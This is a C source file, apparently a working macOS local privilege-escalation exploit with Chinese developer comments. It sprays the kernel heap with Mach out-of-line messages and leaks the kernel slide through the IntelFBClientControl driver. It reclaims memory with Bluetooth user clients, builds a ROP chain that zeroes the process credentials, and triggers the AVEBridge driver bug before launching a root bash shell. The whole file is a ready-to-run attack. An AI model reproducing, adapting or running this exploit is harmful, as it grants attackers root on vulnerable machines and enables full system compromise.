#include <mach-o/loader.h>
#include <sys/mman.h>
#include <pthread.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include <assert.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <stdlib.h>
#include <stdio.h>
#include "librop/librop.h"

#define kIOMasterPortDefault MACH_PORT_NULL
#define PORT_NUM 290000
#define PIPE_SIZE 0x200
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_object_t;

mach_port_t *ports;

//这里踩了一个大坑，拿之前的poc直接改的，但是ool ports和ool memory的消息结构是不大一样的，所以导致堆喷的概率很低
typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_type_number_t count;
} pzp;

void heapInit(){
    ports = calloc(PORT_NUM, sizeof(mach_port_t));
    
    for (int i = 0; i < PORT_NUM; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    }
    
    pzp msg1;
    memset(&msg1, 0, sizeof(pzp));
    pzp msg2;
    memset(&msg2, 0, sizeof(pzp));
    
    uint64_t* buffer = calloc(0x1000, sizeof(uint64_t));
    
    for (int i = 0; i < 0x1000; i++) {
        //这里是为了不让虚表处在outputStruct的开头，因为开头的低32位会被offset覆盖
        buffer[i] = 0xffffff8060002000-0x190;
    }

    buffer[491] = 0;
    
    //init heap fengshui msg
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1);
    msg1.msgh_body.msgh_descriptor_count = 1;
    msg1.desc.address = buffer;
    msg1.desc.size = 0x1000-0x18; //64
    msg1.desc.type = MACH_MSG_OOL_DESCRIPTOR;
    msg1.desc.deallocate = FALSE;
    msg1.desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg1.count = msg1.desc.size;
    
    /*
     // send  all
     pthread_yield_np();
     for (int i = 0; i < PORT_NUM; i++) {
     msg1.head.msgh_remote_port = ports[i];
     kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
     assert(kret==0);
     }
     */
    
    for(int i = 0 ; i < PORT_NUM ; i++) {
        //表示是哪一个msg
        buffer[3]=i;
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    printf("[+]heap spray[1] done..\n");
    sleep(1);
    return;
    
}

void alloc_userclient(){
    kern_return_t err;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
    
    if(service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return;
    }
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if(err != KERN_SUCCESS){
        printf("unable to open user client\n");
        return;
    }
    void *a = malloc(0x110);
    memset(a,0,0x100);
    void *b = malloc(0x110);
    memset(b,0,0x100);
    //在10.13上触发的参数有变动
    size_t size=0x4;
    
    *(uint64_t *)(a+0x38) = 0x4;
    *(uint64_t *)(a+0x40) = 0x4;
    *(uint64_t *)(a+0x48) = 0x28;
    *(uint64_t *)(a+0x50) = 0x8;
    *(uint64_t *)(a+0x60) = 0x2;
    *(uint64_t *)(a+0x84) = 0x4;
    
    //*(uint32_t *)(a+0x60) = 0x74;
    
    err = IOConnectCallMethod(conn,0,NULL,0,a,0x74,NULL,NULL,b,&size);
    if( err != KERN_SUCCESS )
        printf("create fail:%x\n", err);
    return;
}

int infoleak(){
    heapInit();
    pzp msg2;
    memset(&msg2, 0, sizeof(msg2));
    kern_return_t err;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));
    
    if(service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return 0;
    }
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(),0,&conn);
    if(err != KERN_SUCCESS){
        printf("unable to get user client\n");
        return 0;
    }
    
    uint64_t inputScalar[16];
    uint64_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 4096;
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 4096;
    memset(inputStruct, 0, inputStructCnt);
    memset(outputStruct, 0, outputStructCnt);
    *(uint64_t *)(inputStruct) = 0x493dde6;

    
    err = IOConnectCallMethod(
                              conn,
                              0x710,
                              inputScalar,
                              inputScalarCnt,
                              inputStruct,
                              inputStructCnt,
                              outputScalar,
                              &outputScalarCnt,
                              outputStruct,
                              &outputStructCnt);
    
    if(err != KERN_SUCCESS){
        printf("failed, err code: %x\n", err);
        return 0;
    }
    uint64_t *leaked = (uint64_t *)(outputStruct);
    
    printf("[-]msg_id: 0x%llx\n", leaked[10]);
    
    int msg_id = leaked[10];
    
    msg2.head.msgh_local_port = ports[msg_id];
    err = mach_msg(&msg2.head, MACH_RCV_MSG,0,sizeof(msg2), ports[msg_id],0,0);
    //销毁这个msg，方便之后用蓝牙对象做覆盖
    mach_port_deallocate(mach_task_self(), ports[msg_id]);
    mach_port_destroy(mach_task_self(), ports[msg_id]);
    
    for(int i = 0 ; i < 100 ; i++)
        alloc_userclient();
    
    err = IOConnectCallMethod(
                              conn,
                              0x710,
                              inputScalar,
                              inputScalarCnt,
                              inputStruct,
                              inputStructCnt,
                              outputScalar,
                              &outputScalarCnt,
                              outputStruct,
                              &outputStructCnt);
    
   // for(int i =0 ; i < 10 ; i++)
   //     printf("0x%llx\n", leaked[4]);
    
    printf("[+]info leak done..\n[-]kslide : 0x%llx\n", leaked[4]-0xffffff7f82d2c998);
    sleep(1);
    for(int i = 0 ; i < PORT_NUM ; i++){
        if( i != msg_id ){
            msg2.head.msgh_local_port =ports[i];
            kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG,0,sizeof(msg2), ports[i],0,0);
            mach_port_deallocate(mach_task_self(), ports[i]);
            mach_port_destroy(mach_task_self(), ports[i]);
        }
    }
    
    return leaked[4]-0xffffff7f82d2c998;
}

char *chain;
int alloc_and_fill_pipe(){
	int fds[2]={0};
	int err = pipe(fds);
	if (err != KERN_SUCCESS){
		perror("pipe failed\n");
		return -1;
	}
	int read_end = fds[0];
	int write_end = fds[1];
	
	int flags = fcntl(write_end, F_GETFL);
	flags |= O_NONBLOCK;
	fcntl(write_end, F_SETFL, flags);
	
	chain = malloc(PIPE_SIZE);
	memset(chain,'A',PIPE_SIZE);

	ssize_t amount_written = write(write_end, chain, PIPE_SIZE);
	if(amount_written != PIPE_SIZE){
		printf("amount written was short: 0x%ld\n", amount_written);
	}
	return read_end;
}

//这里的infoleak并不能泄漏有效信息，但是也是一个漏洞
/*
int infoleak(){
	kern_return_t err;
		
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));

	if(service == IO_OBJECT_NULL){
		printf("unable to find service\n");
		return 0;
	}

	io_connect_t conn = MACH_PORT_NULL;
	err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	if(err != KERN_SUCCESS){
		printf("unable to get user client\n");
		return 0;
	}

	uint64_t inputScalar[16];
	uint64_t inputScalarCnt = 0;
		
	char inputStruct[4096];
	size_t inputStructCnt = 4096;
	uint64_t outputScalar[16];
	uint32_t outputScalarCnt = 0;
		
	char outputStruct[4096];
	size_t outputStructCnt = 4096;
	memset(inputStruct, 0, inputStructCnt);
	memset(outputStruct, 0, outputStructCnt);
	*(uint32_t *)inputStruct = 0x2000*601;	
	//*(uint32_t *)outputStruct = 0x41414141;

	err = IOConnectCallMethod(
			                  conn,
			                  0x80000852,
			                  inputScalar,
			                  inputScalarCnt,
			                  inputStruct,
			                  inputStructCnt,
			                  outputScalar, 
			                  &outputScalarCnt,
			                  outputStruct,
			                  &outputStructCnt);
		
	if(err != KERN_SUCCESS){
		printf("failed, err code: %x\n", err);
		return 0;
	}
  
	uint64_t *leaked = (uint64_t *)(outputStruct);
	for(int i = 0 ; i < 0x10 ; i++)
		printf("0x%x\n", leaked[i]);
    
  printf("[+]info leak done..\n");		
	return 0;

}
*/

void cause_gc(){
	mach_port_t* ports = calloc(PORT_NUM, sizeof(mach_port_t));
    
	for (int i = 0; i < PORT_NUM; i++) {
        	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        	mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    	}

	for(int i = 0 ; i < PORT_NUM ; i++){
    mach_port_deallocate(mach_task_self(), ports[i]);
		mach_port_destroy(mach_task_self(), ports[i]);
	}
}

void rop_init(){
  
    uint64_t kaslr_shift = infoleak();
    SET_KERNEL_SLIDE(kaslr_shift);
    macho_map_t *map = map_file_with_path("/System/Library/Kernels/kernel");
  	mach_port_t* ports = calloc(PORT_NUM, sizeof(mach_port_t));
    
    	for (int i = 0; i < PORT_NUM; i++) {
        	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        	mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    	}

    pzp msg1;
    memset(&msg1, 0, sizeof(pzp));
    pzp msg2;
    memset(&msg2, 0, sizeof(pzp));
    
    uint64_t* buffer = calloc(0x1000, sizeof(uint64_t));
    
    for (int i = 0; i < 0x1000; i++) {
        buffer[i] = 0xffffff8060001018;
    }

    uint64_t page_start = 0xffffff8060001000;
    buffer[0] = page_start+0x18;
    buffer[1] = ROP_NOP(map);
    buffer[2] = ROP_NOP(map);
    buffer[3] = ROP_NOP(map);
    buffer[4] = ROP_NOP(map);
    buffer[5] = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));
    buffer[6] = ROP_POP_RCX(map);
    buffer[7] = ROP_NOP(map);
    buffer[8] = ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map);
    buffer[9] = 0xdeadbeefdeadbeef;
    buffer[10] = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));
    buffer[11] = ROP_POP_RCX(map);
    buffer[12] = ROP_NOP(map);
    buffer[13] = ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map);
    buffer[14] = 0xdeadbeefdeadbeef;
    buffer[15] = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));
    buffer[16] = ROP_POP_RCX(map);
    buffer[17] = ROP_NOP(map);
    buffer[18] = ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map);
    buffer[19] = 0xdeadbeefdeadbeef;
    buffer[20] = ROP_POP_RSI(map);
    buffer[21] = (sizeof(int) * 3);
    buffer[22] = SLIDE_POINTER(find_symbol_address(map, "_bzero"));
    buffer[23] = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));
    buffer[57] = ROP_XCHG_RSP_RAX(map);
    
    
    //init heap fengshui msg
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1);
    msg1.msgh_body.msgh_descriptor_count = 1;
    msg1.desc.address = buffer;
    //这里要减去metadata，不然就会被分到kalloc.8192了
    msg1.desc.size = 0x1000-0x18; 
    msg1.desc.type = MACH_MSG_OOL_DESCRIPTOR;
    msg1.desc.deallocate = FALSE;
    msg1.desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg1.count = msg1.desc.size;
/* 
   // send  all
    pthread_yield_np();
    for (int i = 0; i < PORT_NUM; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
*/
    for(int i = 0 ; i < PORT_NUM ; i++) {
		msg1.head.msgh_remote_port = ports[i];
		kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
		assert(kret==0);
	} 
		
    printf("[+]heap spray[2] done..\n");
	return;

}

int main()
{ 
    rop_init();
    sleep(1);

/*

    // recv
    pthread_yield_np();
    for (int i = 0; i < PORT_NUM ; i++) {
        msg2.head.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        assert(kret==0);
    }
getchar();
    //send 
    pthread_yield_np();
    for (int i = 0 ; i < PORT_NUM ; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }

getchar();
  */  

	  io_service_t service = MACH_PORT_NULL; 
	  kern_return_t err;
	  service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("com_apple_AVEBridge"));
	  if(service == IO_OBJECT_NULL){
		    printf("unable to find service\n");
		    return 0;
	  } 	

	  io_connect_t conn = MACH_PORT_NULL;
	  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	  if(err != KERN_SUCCESS){
		    printf("unable to get user client connection!\n");
		    return 0;
	  }

	
	  //Scalar
	  uint64_t inputValue[10];
	  uint64_t outputValue[10];
	  uint32_t inputSize = 0;
	  uint32_t outputSize;

	  //Struct
	  uint64_t *inputStruct;
	  uint64_t *outputStruct;
	  size_t inputStructSize=0;
	  size_t outputStructSize;
	
	  err = IOConnectCallMethod(
                          conn,
                          0,
                          inputValue,
                          inputSize,
                          inputStruct,
                          inputStructSize,
                          outputValue,
                          &outputSize,
                          outputStruct,
                          &outputStructSize);
	
	  if(err != KERN_SUCCESS){
		    printf("unable to open user client\n");
		    return 0;
	  }	
	  
    printf("[-]object create done..\n");
    sleep(1);
	  
    inputValue[0] = 81920494;
	  inputSize = 1;
	  outputValue[0] = 0;
	  outputSize = 1;
	  
    err = IOConnectCallMethod(
                          conn,
                          3,
                          inputValue,
                          inputSize,
                          inputStruct,
                          inputStructSize,
                          outputValue,
                          &outputSize,
                          outputStruct,
                          &outputStructSize);	

	err = IOServiceClose(conn);

	if( err != KERN_SUCCESS){
		printf("can't close the connection\n");
	}
    
    if(getuid() == 0){
		    printf("[+]get root\n");
        system("/bin/bash");
    }else
		    printf("failed...\n");
	  
    return 0;
}
